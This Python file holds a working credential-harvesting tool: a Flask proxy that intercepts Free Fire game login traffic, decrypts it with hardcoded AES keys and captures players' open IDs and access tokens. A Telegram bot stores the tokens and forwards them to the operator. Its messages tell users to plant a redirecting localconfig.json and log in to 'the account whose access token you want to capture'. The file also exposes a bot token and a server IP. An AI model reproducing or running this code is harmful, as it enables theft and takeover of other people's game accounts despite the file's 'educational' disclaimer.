from flask import Flask, request, Response
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import time
import json
import os
import sqlite3
import asyncio
from datetime import datetime

# Telegram Bot
from telegram.constants import ParseMode
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

app = Flask(__name__)

# ================== CONFIG ==================
BOT_TOKEN = "8581119327:AAHMYbslWShlMwnGAcRhKbKOl4vA7J0gYBY"
REAL_CLIENT_SERVER = "https://clientbp.ggpolarbear.com"
LOCAL_IP = "87.232.72.125"
PORT = 5013

AES_KEY = b"Yg&tc%DEuh6%Zc^8"
AES_IV = b"6oyZDr22E3ychjM%"

OWNER_ID = 8679993003
BOT_USERNAME = "@code3201_bot"
CHANNEL_USERNAME = "@FREEFlRECODE"  # Force join channel
DEV_USERNAME = "@FounderOfKrishna"

DB_PATH = "bot_database.db"
TOKEN_JSON_PATH = "tokens.json"

sessions = {}

print("🚀 Starting Proxy + Telegram Bot (Professional Edition)...")

# ================== DATABASE SETUP ==================
def init_database():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Users table
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            chat_id INTEGER,
            joined_at TEXT,
            is_blocked INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    """)
    
    # Tokens table
    c.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            open_id TEXT,
            access_token TEXT,
            captured_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)
    
    # Broadcast history
    c.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT,
            sent_at TEXT,
            total_sent INTEGER
        )
    """)
    
    conn.commit()
    conn.close()

def db_add_user(user_id, username, first_name, chat_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        INSERT OR IGNORE INTO users (user_id, username, first_name, chat_id, joined_at)
        VALUES (?, ?, ?, ?, ?)
    """, (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def db_get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def db_get_all_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users")
    users = c.fetchall()
    conn.close()
    return users

def db_get_total_users():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 0")
    count = c.fetchone()[0]
    conn.close()
    return count

def db_save_token(user_id, open_id, access_token):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        INSERT INTO tokens (user_id, open_id, access_token, captured_at)
        VALUES (?, ?, ?, ?)
    """, (user_id, open_id, access_token, timestamp))
    conn.commit()
    conn.close()
    
    # Also save to tokens.json
    save_token_to_json(user_id, open_id, access_token, timestamp)

def save_token_to_json(user_id, open_id, access_token, timestamp):
    data = []
    if os.path.exists(TOKEN_JSON_PATH):
        try:
            with open(TOKEN_JSON_PATH, "r") as f:
                data = json.load(f)
        except:
            data = []
    
    data.append({
        "user_id": user_id,
        "open_id": open_id,
        "access_token": access_token,
        "captured_at": timestamp
    })
    
    with open(TOKEN_JSON_PATH, "w") as f:
        json.dump(data, f, indent=4)

def db_get_user_tokens(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM tokens WHERE user_id = ? ORDER BY id DESC", (user_id,))
    tokens = c.fetchall()
    conn.close()
    return tokens

def db_get_all_tokens():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        SELECT tokens.*, users.username, users.first_name 
        FROM tokens LEFT JOIN users ON tokens.user_id = users.user_id 
        ORDER BY tokens.id DESC
    """)
    tokens = c.fetchall()
    conn.close()
    return tokens

def db_get_total_tokens():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM tokens")
    count = c.fetchone()[0]
    conn.close()
    return count

def db_block_user(user_id, block=True):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET is_blocked = ? WHERE user_id = ?", (1 if block else 0, user_id))
    conn.commit()
    conn.close()

def db_ban_user(user_id, ban=True):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if ban else 0, user_id))
    conn.commit()
    conn.close()

def db_save_broadcast(message, total_sent):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
        INSERT INTO broadcasts (message, sent_at, total_sent)
        VALUES (?, ?, ?)
    """, (message, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), total_sent))
    conn.commit()
    conn.close()

# Initialize DB
init_database()

# ================== DECRYPT FUNCTIONS ==================
def decrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        decrypted = cipher.decrypt(data)
        return unpad(decrypted, AES.block_size)
    except:
        return None

def decode_login_request(data):
    try:
        decrypted = decrypt(data)
        if decrypted is None:
            return None

        import MajorLoginReq_pb2
        msg = MajorLoginReq_pb2.MajorLogin()
        msg.ParseFromString(decrypted)
        
        return {
            "open_id": msg.open_id,
            "access_token": msg.access_token,
        }
    except Exception as e:
        print(f"Decode error: {e}")
        return None

def send_to_telegram(chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Telegram send error: {e}")

# ================== PROXY ==================
def proxy_request(real_url, endpoint, tg_user_id=None):
    req_data = request.get_data()

    if 'GetLoginData' in endpoint:
        decoded = decode_login_request(req_data)
        if decoded:
            access_token = decoded.get("access_token", "")
            open_id = decoded.get("open_id", "")
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if tg_user_id and tg_user_id in sessions:
                sessions[tg_user_id]["tokens"].append({
                    "open_id": open_id,
                    "access_token": access_token,
                    "time": timestamp
                })
                
                # Save to DB and JSON
                try:
                    uid_int = int(tg_user_id)
                    db_save_token(uid_int, open_id, access_token)
                except:
                    pass

            print(f"[+] Open ID: {open_id}")
            print(f"[+] Access Token: {access_token} | User: {tg_user_id}")

            # Send to Telegram
            if tg_user_id and tg_user_id in sessions:
                chat_id = sessions[tg_user_id]["chat_id"]
                tg_message = f"""
🔥 <b>ɴᴇᴡ ʟᴏɢɪɴ ᴄᴀᴘᴛᴜʀᴇᴅ!</b>

👤 <b>ᴏᴘᴇɴ ɪᴅ</b>
<code>{open_id}</code>

🔑 <b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b>
<code>{access_token}</code>

🕒 <b>ᴄᴀᴘᴛᴜʀᴇᴅ ᴏɴ</b>
<i>{timestamp}</i>

━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <i><b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴋʀɪsʜɴᴀ ᴄᴏᴅᴇʀ</b></i>
                """.strip()
                threading.Thread(target=send_to_telegram, args=(chat_id, tg_message), daemon=True).start()

            message = (
                f"[ffffff][b][c][I]Open ID: [00ff00]{open_id}\n\n"
                f"[ffffff][b][c][I]Access Token: [00ff00]{access_token}\n\n"
                f"[00ff00][b][c][I]Developed by KrishnaCoder"
            )  
            return Response(message.encode('utf-8'), 500)
    
    # Normal Proxy
    resp = requests.request(
        method=request.method,
        url=real_url,
        headers={key: value for key, value in request.headers if key.lower() != 'host'},
        data=req_data,
        cookies=request.cookies,
        allow_redirects=False,
        stream=True,
        timeout=10
    )

    return Response(resp.content, resp.status_code, 
                    [(name, value) for (name, value) in resp.raw.headers.items() 
                     if name.lower() not in ['content-encoding', 'transfer-encoding', 'connection']])

# ================== FLASK ROUTES ==================
@app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
@app.route('/<path:path>', methods=['POST', 'GET'])
def catch_all(path):
    if not path:
        return "OK", 200

    parts = path.split('/', 1)
    tg_user_id = parts[0]
    sub_path = parts[1] if len(parts) > 1 else ""
    
    real_url = f'{REAL_CLIENT_SERVER}/{sub_path}'
    return proxy_request(real_url, sub_path or path, tg_user_id)

@app.route('/<tg_user_id>/', methods=['GET'])
def session_info(tg_user_id):
    if tg_user_id in sessions:
        link = f"http://{LOCAL_IP}:{PORT}/{tg_user_id}/"
        return f"<b>✅ Session Active</b><br>Proxy URL: <code>{link}</code>", 200
    return "Session not found. Bot mein /start karo.", 404

# ================== HELPER: GET KEYBOARD ==================
def get_user_keyboard(user_id):
    """Build keyboard based on user role. Owner gets extra buttons."""
    keyboard = [
        [KeyboardButton("ᴄʀᴇᴀᴛᴇ ᴜʀʟ"), KeyboardButton("ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ")],
        [KeyboardButton(f"👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ")]
    ]
    
    # Add owner-only buttons
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ")])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ================== TELEGRAM COMMANDS ==================
async def check_subscription(user_id, context):
    """Check if user is a member of the required channel."""
    try:
        chat_member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(f"Subscription check error: {e}")
        return False

async def force_join_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send force join message with channel link."""
    keyboard = [
        [InlineKeyboardButton(" ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(" ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
f"<b>⚠️ ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ꜰɪʀsᴛ!</b>\n\n"
f"<i>ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ, ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴏᴜʀ ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ.</i>\n\n"
f"📢 <b>ᴄʜᴀɴɴᴇʟ:</b> {CHANNEL_USERNAME}\n\n"
f"<i>ᴀꜰᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ <b>✅ ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ</b> ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.</i>",
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    chat_id = update.effective_chat.id
    
    # Check if user is banned
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:  # is_banned
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    # Force join check
    is_member = await check_subscription(user_id, context)
    if not is_member:
        await force_join_prompt(update, context)
        return
    
    # Add user to database
    db_add_user(user_id, username, first_name, chat_id)
    
    # Initialize session
    sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}
    
    # Welcome message
    welcome_text = (
    f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {first_name}!</b>\n\n"
    f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
    f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
    f"<i>ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ᴘʀᴏxʏ ᴜʀʟ ᴀɴᴅ ᴠɪᴇᴡ ᴄᴀᴘᴛᴜʀᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs ᴀꜰᴛᴇʀ ᴀ sᴜᴄᴄᴇssꜰᴜʟ ɢᴀᴍᴇ ʟᴏɢɪɴ.</i>\n\n"
    f"📌 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n"
    f"• ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ <b>ᴘʀᴏxʏ ᴜʀʟ</b>.\n"
    f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ sᴇᴛ ᴜᴘ <code>localconfig.json</code>.\n"
    f"• ʟᴏɢ ɪɴ ᴛᴏ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴏʀ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>.\n"
    f"• ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴀᴘᴛᴜʀᴇᴅ ᴛᴏᴋᴇɴ.\n\n"
    f"⚠️ <b>ᴘʀᴇᴄᴀᴜᴛɪᴏɴ</b>\n"
    f"<i>ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴏʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ. ᴋᴇᴇᴘ ɪᴛ ᴘʀɪᴠᴀᴛᴇ.</i>\n\n"
    f"📜 <b>ᴅɪsᴄʟᴀɪᴍᴇʀ</b>\n"
    f"<i>ᴛʜɪs ʙᴏᴛ ɪs ᴘʀᴏᴠɪᴅᴇᴅ ꜰᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴀɴᴅ ᴛᴇsᴛɪɴɢ ᴘᴜʀᴘᴏsᴇs. ᴜsᴇ ɪᴛ ʀᴇsᴘᴏɴsɪʙʟʏ ᴀɴᴅ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.</i>\n\n"
    f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> {DEV_USERNAME}"
    )
    
    await update.message.reply_html(welcome_text, reply_markup=get_user_keyboard(user_id))

async def check_joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    
    is_member = await check_subscription(user_id, context)
    
    if is_member:
        db_add_user(user_id, query.from_user.username, query.from_user.first_name, chat_id)
        sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}
        
        welcome_text = (
f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {query.from_user.first_name}!</b>\n\n"
f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
f"<i>ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ᴘʀᴏxʏ ᴜʀʟ, sᴇᴛ ᴜᴘ <code>localconfig.json</code>, ᴀɴᴅ ᴠɪᴇᴡ ʏᴏᴜʀ ᴄᴀᴘᴛᴜʀᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs.</i>\n\n"
f"📌 <b>ɢᴇᴛ sᴛᴀʀᴛᴇᴅ</b>\n"
f"• ᴘʀᴇss <b>🔗 ᴄʀᴇᴀᴛᴇ ᴜʀʟ</b> ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ sᴇʀᴠᴇʀ ᴜʀʟ.\n"
f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ sᴇᴛᴜᴘ ɪɴsᴛʀᴜᴄᴛɪᴏɴs.\n"
f"• ʟᴏɢ ɪɴ ᴛᴏ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴏʀ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>.\n"
f"• ʀᴇᴛᴜʀɴ ʜᴇʀᴇ ᴀɴᴅ ᴘʀᴇss <b>📥 ᴄʜᴇᴄᴋ ᴛᴏᴋᴇɴ</b>.\n\n"
f"⚠️ <b>ɴᴏᴛᴇ:</b> <i>ᴋᴇᴇᴘ ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴀɴᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴘʀɪᴠᴀᴛᴇ. ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜᴇᴍ ᴡɪᴛʜ ᴏᴛʜᴇʀs.</i>\n\n"
f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> {DEV_USERNAME}"
        )
        
        await query.edit_message_text(welcome_text, parse_mode="HTML")
        await query.message.reply_html(
            "<b>ʏᴏᴜ ᴀʀᴇ ɴᴏᴡ ᴠᴇʀɪꜰɪᴇᴅ!</b>",
            reply_markup=get_user_keyboard(user_id)
        )
    else:
        keyboard = [
            [InlineKeyboardButton(" ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(" ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"<b>⚠️ ʏᴏᴜ ʜᴀᴠᴇɴ'ᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!</b>\n\n"
            f"<i>ᴘʟᴇᴀsᴇ ᴊᴏɪɴ <b>{CHANNEL_USERNAME}</b> ꜰɪʀsᴛ, ᴛʜᴇɴ ᴄʟɪᴄᴋ <b>✅ ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ</b> ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.</i>",
            parse_mode="HTML",
            reply_markup=reply_markup
        )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Check subscription first
    is_member = await check_subscription(user_id, context)
    if not is_member:
        await force_join_prompt(update, context)
        return
    
    # Check if user is banned
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    if text == "ᴄʀᴇᴀᴛᴇ ᴜʀʟ":
        if str(user_id) not in sessions:
            sessions[str(user_id)] = {"chat_id": update.effective_chat.id, "tokens": []}
        
        link = f"http://{LOCAL_IP}:{PORT}/{user_id}/"
        
        config_data = {"serverLoginUrl": link}
        config_json_str = json.dumps(config_data, indent=2)
        
        config_filename = f"localconfig_{user_id}.json"
        with open(config_filename, "w") as f:
            json.dump(config_data, f, indent=4)
        
        msg = (
    f"<b>🔗 ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ sᴇʀᴠᴇʀ ᴜʀʟ</b>\n\n"
    f"<code>{link}</code>\n\n"
    f"<b>📋 ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n\n"
    f"1. ᴄᴏᴘʏ ᴛʜᴇ <b>sᴇʀᴠᴇʀ ᴜʀʟ</b> ᴀʙᴏᴠᴇ.\n\n"
    f"2. ɢᴏ ᴛᴏ ᴛʜᴇ ꜰᴏʟʟᴏᴡɪɴɢ ᴅɪʀᴇᴄᴛᴏʀʏ:\n"
    f"<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n\n"
    f"3. ᴄʀᴇᴀᴛᴇ ᴀ ꜰɪʟᴇ ɴᴀᴍᴇᴅ <code>localconfig.json</code>.\n\n"
    f"4. ᴘᴀsᴛᴇ ᴛʜᴇ ꜰᴏʟʟᴏᴡɪɴɢ ᴄᴏɴᴛᴇɴᴛ ɪɴᴛᴏ ᴛʜᴇ ꜰɪʟᴇ, ʀᴇᴘʟᴀᴄɪɴɢ ᴛʜᴇ ᴜʀʟ ᴡɪᴛʜ ʏᴏᴜʀ ᴏᴡɴ sᴇʀᴠᴇʀ ᴜʀʟ:\n"
    f"<pre>{config_json_str}</pre>\n\n"
    f"5. sᴀᴠᴇ ᴛʜᴇ ꜰɪʟᴇ.\n\n"
    f"6. ᴏᴘᴇɴ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b> ᴀɴᴅ ʟᴏɢ ɪɴ ᴛᴏ ᴛʜᴇ ᴀᴄᴄᴏᴜɴᴛ ᴡʜᴏsᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄᴀᴘᴛᴜʀᴇ.\n\n"
    f"7. ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ. ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ ᴀꜰᴛᴇʀ ᴀ sᴜᴄᴄᴇssꜰᴜʟ ʟᴏɢɪɴ.\n\n"
    f"⚠️ <b>ɴᴏᴛᴇ:</b> <i>ᴛʜɪs ᴍᴇᴛʜᴏᴅ ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴀɴᴅ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>. ɪꜰ ʏᴏᴜ ꜰᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴅᴍ <b>@FounderOfKrishna</b>.</i>"
        )
        
        await update.message.reply_html(msg)
        
        # Send the config file, then delete it
        try:
            with open(config_filename, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename="localconfig.json",
                    caption=(
    "📂 <b>ᴘʟᴀᴄᴇ ᴛʜɪs ꜰɪʟᴇ ɪɴ ʏᴏᴜʀ ɢᴀᴍᴇ ᴅɪʀᴇᴄᴛᴏʀʏ</b>\n\n"
    "<b>ʜᴏᴡ ᴛᴏ ᴜsᴇ:</b>\n"
    "1. ᴅᴏᴡɴʟᴏᴀᴅ ᴛʜᴇ ꜰɪʟᴇ.\n"
    "2. ᴏᴘᴇɴ ᴛʜᴇ ꜰᴏʟᴅᴇʀ ᴡʜᴇʀᴇ ᴛʜᴇ ꜰɪʟᴇ ᴡᴀs ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ.\n"
    "3. ᴄᴏᴘʏ ᴛʜᴇ ꜰɪʟᴇ.\n"
    "4. ᴏᴘᴇɴ:\n"
    "<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    "5. ᴘᴀsᴛᴇ ᴛʜᴇ ꜰɪʟᴇ ɪɴᴛᴏ ᴛʜɪs ꜰᴏʟᴅᴇʀ.\n"
    "6. ᴏᴘᴇɴ ᴛʜᴇ ɢᴀᴍᴇ ᴀɴᴅ ʟᴏɢ ɪɴ ᴛᴏ ᴛʜᴇ ᴀᴄᴄᴏᴜɴᴛ ᴡʜᴏsᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴛʀɪᴇᴠᴇ.\n"
    "7. ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ. ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ ᴀꜰᴛᴇʀ ᴀ sᴜᴄᴄᴇssꜰᴜʟ ʟᴏɢɪɴ.\n\n"
    "⚠️ <b>ɴᴏᴛᴇ:</b> <i>ᴛʜɪs ᴍᴇᴛʜᴏᴅ ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴀɴᴅ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>. ɪꜰ ʏᴏᴜ ꜰᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴅᴍ <b>@FounderOfKrishna</b>.</i>"
                    ),
                    parse_mode="HTML"
                )
        except Exception as e:
            await update.message.reply_text(f"⚠️ Could not send file: {e}")
        
        # Delete the localconfig file after sending to save storage
        try:
            if os.path.exists(config_filename):
                os.remove(config_filename)
                print(f"🗑️ Deleted temporary file: {config_filename}")
        except Exception as e:
            print(f"⚠️ Could not delete {config_filename}: {e}")
    
    elif text == "ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ":
        tokens = db_get_user_tokens(user_id)  # Only this user's tokens
        
        if not tokens:
            await update.message.reply_html(
    "<b>📭 ɴᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs ꜰᴏᴜɴᴅ</b>\n\n"
    "ɴᴏ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs ʜᴀᴠᴇ ʙᴇᴇɴ ᴄᴀᴘᴛᴜʀᴇᴅ ʏᴇᴛ.\n\n"
    "<b>ʜᴏᴡ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴛᴏᴋᴇɴ:</b>\n\n"
    "1. ᴄʟɪᴄᴋ <b>🔗 ᴄʀᴇᴀᴛᴇ ᴜʀʟ</b> ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ sᴇʀᴠᴇʀ ᴜʀʟ.\n"
    "2. ᴄʀᴇᴀᴛᴇ ᴏʀ ᴜᴘᴅᴀᴛᴇ <code>localconfig.json</code> ᴡɪᴛʜ ᴛʜᴀᴛ ᴜʀʟ.\n"
    "3. ᴘʟᴀᴄᴇ ᴛʜᴇ ꜰɪʟᴇ ɪɴ ᴛʜᴇ ɢᴀᴍᴇ ᴅɪʀᴇᴄᴛᴏʀʏ.\n"
    "4. ᴏᴘᴇɴ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴏʀ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b> ᴀɴᴅ ʟᴏɢ ɪɴ.\n"
    "5. ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴘʀᴇss <b>ᴄʜᴇᴄᴋ ᴛᴏᴋᴇɴ</b> ᴛᴏ ᴠɪᴇᴡ ʏᴏᴜʀ ᴄᴀᴘᴛᴜʀᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ."
            )
            return
        
        # Full detailed token display — user's own tokens only, NO file download
        lines = [f"<b>🎫 Your Access Tokens ({len(tokens)})</b>\n"]
        for i, t in enumerate(tokens, 1):
            lines.append(
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b>Access Token {i}</b>\n"
                f"🆔 <b>Open ID:</b> <code>{t[2]}</code>\n"
                f"🔑 <b>Access Token:</b> <code>{t[3]}</code>\n"
                f"⏰ <b>Time:</b> {t[4]}\n"
            )
        
        token_text = "\n".join(lines)
        
        # Send in chunks if too long (Telegram 4096 char limit)
        if len(token_text) > 4000:
            chunks = []
            current_chunk = ""
            for line in token_text.split("\n"):
                if len(current_chunk) + len(line) > 3900:
                    chunks.append(current_chunk)
                    current_chunk = line + "\n"
                else:
                    current_chunk += line + "\n"
            if current_chunk:
                chunks.append(current_chunk)
            
            for chunk in chunks:
                if chunk.strip():
                    await update.message.reply_html(chunk.strip())
        else:
            await update.message.reply_html(token_text)
    
    elif text == f"👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ":
        await update.message.reply_html(
    f"<b>👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b>\n\n"
    f"👤 <b>ᴅᴇᴠᴇʟᴏᴘᴇʀ:</b> {DEV_USERNAME}\n"
    f"🤖 <b>ʙᴏᴛ:</b> {BOT_USERNAME}\n"
    f"📢 <b>ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ:</b> {CHANNEL_USERNAME}\n\n"
    f"<b>ᴀʙᴏᴜᴛ:</b>\n"
